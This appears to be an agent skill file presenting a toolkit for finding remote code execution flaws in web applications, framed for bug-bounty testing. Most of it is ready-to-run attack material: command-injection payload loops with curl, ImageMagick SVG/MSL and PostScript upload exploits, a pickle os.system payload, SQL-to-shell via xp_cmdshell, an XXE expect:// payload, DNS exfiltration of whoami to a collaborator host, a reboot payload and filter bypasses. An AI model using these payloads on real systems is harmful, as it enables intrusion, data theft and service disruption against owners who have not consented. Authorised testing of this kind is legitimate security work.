---
description: Find RCE vulnerabilities in web applications. Use when testing for RCE issues.
---

# RCE Vulnerability Testing Toolkit

## High-Value Patterns from Real Reports

### Vulnerable Parameters
- **Command Injection**: `cmd`, `command`, `exec`, `system`, `target`, `url`, `redirect`, `DOC_ID`, `libjars`
- **File Upload**: `logo`, `image`, `file`, `upload`, `attachment`
- **Template Injection**: `template`, `format`, `message`, `comment`, `name`
- **Serialization**: Any parameter accepting serialized data, base64 encoded payloads
- **Path Traversal**: `path`, `file`, `filename`, `include`, `redirect_uri`

### Vulnerable Endpoints
```bash
# Common RCE endpoints
/api/v*/exec
/api/v*/command
/admin/system
/upload
/import
/preview
/script
/console
/*action.cgi
/sptest_action.cgi
/constructor
/onboarding/*
```

### Vulnerable Headers
```bash
# Test these headers for injection
X-Forwarded-For: command injection payloads
User-Agent: template injection
Content-Type: file upload bypass
X-Client: parameter pollution
```

## Step-by-Step Testing Methodology

### 1. Discovery Phase
```bash
# Discover endpoints with potential RCE
curl -s "$TARGET" | grep -oE "(exec|command|system|upload|import|script)" | sort -u

# Find parameter names in forms
curl -s "$TARGET" | grep -oE 'name="[^"]*"' | grep -E "(cmd|exec|file|path|url)" 

# Check for management interfaces
curl -sk "$TARGET/script" -o /dev/null -w "%{http_code}\n"
curl -sk "$TARGET/console" -o /dev/null -w "%{http_code}\n"
curl -sk "$TARGET/admin/system" -o /dev/null -w "%{http_code}\n"
```

### 2. Command Injection Testing
```bash
# Basic command injection payloads
PAYLOADS=(
    "; ping -c 3 $(whoami).burpcollaborator.net"
    "| whoami"
    "\`id\`"
    "$(curl burpcollaborator.net)"
    "; reboot"
    "& ping burpcollaborator.net"
)

# Test GET parameters
for payload in "${PAYLOADS[@]}"; do
    curl -sk "$TARGET/endpoint?cmd=$payload" -w "%{http_code}\n"
done

# Test POST parameters  
for payload in "${PAYLOADS[@]}"; do
    curl -sk "$TARGET/endpoint" -d "target=$payload&action=remote" -w "%{http_code}\n"
done
```

### 3. File Upload RCE Testing
```bash
# ImageMagick RCE via SVG
cat > exploit.svg << 'EOF'
<svg width="1000" height="1000" xmlns="http://www.w3.org/2000/svg">
<image xlink:href="msl:exploit.msl" height="500" width="500"/>
</svg>
EOF

cat > exploit.msl << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<image>
  <read filename="/etc/passwd" />
  <write filename="./output.txt" />
</image>
EOF

# Upload malicious files
curl -sk "$TARGET/upload" -F "logo=@exploit.svg" -F "file=@exploit.msl"

# PostScript injection for ImageMagick
cat > evil.jpg << 'EOF'
%!PS
userdict /setpagedevice undef
{ null restore } stopped { pop } if
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
EOF

curl -sk "$TARGET/upload" -F "image=@evil.jpg"
```

### 4. Serialization RCE Testing
```bash
# PHP unserialize RCE indicators
curl -sk "$TARGET/api" -d 'data=O:8:"stdClass":0:{}'

# Check for serialized data in responses
curl -sk "$TARGET/api" | grep -E "([aO]:[0-9]+:|s:[0-9]+:)"

# Test pickle/python serialization
python3 -c "import pickle,base64; print(base64.b64encode(pickle.dumps('__import__(\"os\").system(\"id\")')).decode())" | \
    xargs -I {} curl -sk "$TARGET/api" -d "data={}"
```

### 5. Template Injection Testing
```bash
# Server-Side Template Injection payloads
SSTI_PAYLOADS=(
    "{{7*7}}"
    "${7*7}"
    "<%=7*7%>"
    "#set(\$x=7*7)\$x"
    "{{config}}"
    "{{request}}"
)

for payload in "${SSTI_PAYLOADS[@]}"; do
    curl -sk "$TARGET/api" -d "message=$payload" | grep -E "(49|config|<class)"
done
```

### 6. SQL Injection to RCE
```bash
# Test for SQL injection with RCE potential
curl -sk "$TARGET/api" -d "DOC_ID=1;EXEC xp_cmdshell('ping burpcollaborator.net')" 

# MSSQL command execution
curl -sk "$TARGET/api" -d "id=1';EXEC master..xp_cmdshell 'ping burpcollaborator.net'--"

# PostgreSQL command execution  
curl -sk "$TARGET/api" -d "id=1';COPY (SELECT '') TO PROGRAM 'ping burpcollaborator.net'--"
```

### 7. XXE to RCE
```bash
# XXE payload for command execution
cat > xxe.xml << 'EOF'
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "expect://id" >
]>
<root>&xxe;</root>
EOF

curl -sk "$TARGET/api" -H "Content-Type: application/xml" -d @xxe.xml
```

## Severity Rating Table

| Impact | Criteria | Score |
|--------|----------|--------|
| **Critical** | Unauthenticated RCE as SYSTEM/root | 9.0-10.0 |
| **High** | Authenticated RCE, privilege escalation | 7.0-8.9 |
| **Medium** | Limited RCE, sandboxed execution | 4.0-6.9 |
| **Low** | Information disclosure, DoS only | 1.0-3.9 |

### Scoring Modifiers
- **+2.0**: Internet-facing service
- **+1.5**: Default credentials/no auth required  
- **+1.0**: Affects multiple users/instances
- **-1.0**: Requires complex user interaction
- **-2.0**: Heavy mitigating factors (sandboxing, etc.)

## False Positives to Ignore

### Non-Exploitable Responses
```bash
# These responses are typically false positives:
grep -E "(syntax error|parse error|undefined function)" # Likely filtered input
grep -E "command not found" # Command blocked but injection confirmed
grep -E "(Permission denied|Access denied)" # Injection works but limited permissions
```

### Safe Command Outputs
- Error messages mentioning "safe mode" or "disabled functions"
- Responses indicating input validation (but still test further)
- Timeout responses without confirmation of execution

### Expected Behaviors
- 403/401 responses on admin endpoints (normal security)
- File upload rejections based on file type (normal filtering)
- Generic error messages without specific command output

## Finding Report Template

```markdown
# Remote Code Execution via [Vector] on [Target]

## Summary
[Brief description of the vulnerability and impact]

## Vulnerability Details
- **Endpoint**: [URL/endpoint]
- **Parameter**: [vulnerable parameter name]
- **Method**: [HTTP method]
- **Attack Vector**: [command injection/file upload/etc.]

## Steps to Reproduce
1. [Step by step reproduction]
2. Include exact curl commands used
3. Show request/response pairs

## Proof of Concept
```bash
# Exact commands to reproduce
curl -sk "https://target/endpoint" -d "param=payload"
```

## Evidence
- Command output showing RCE
- Screenshots of exploitation
- Network callbacks/DNS logs

## Impact
- [Specific impact description]
- [Affected systems/users]
- [Business risk]

## Remediation
- Input validation and sanitization
- Principle of least privilege
- Disable dangerous functions
- Update vulnerable components

## Severity: [Critical/High/Medium/Low]
**CVSS Score**: [X.X] based on [criteria]
```

## Advanced Techniques

### Blind RCE Detection
```bash
# DNS exfiltration
curl -sk "$TARGET/api" -d "cmd=nslookup \`whoami\`.burpcollaborator.net"

# Time-based detection
curl -sk "$TARGET/api" -d "cmd=sleep 5" -w "Time: %{time_total}s\n"

# File system markers
curl -sk "$TARGET/api" -d "cmd=touch /tmp/pwned_\$(date +%s)"
```

### Bypass Techniques
```bash
# Command substitution variations
BYPASS_PAYLOADS=(
    "\$(command)"
    "\`command\`"  
    "command"
    "{command,argument}"
    "co''mmand"
    'co""mmand'
    "com\mand"
)
```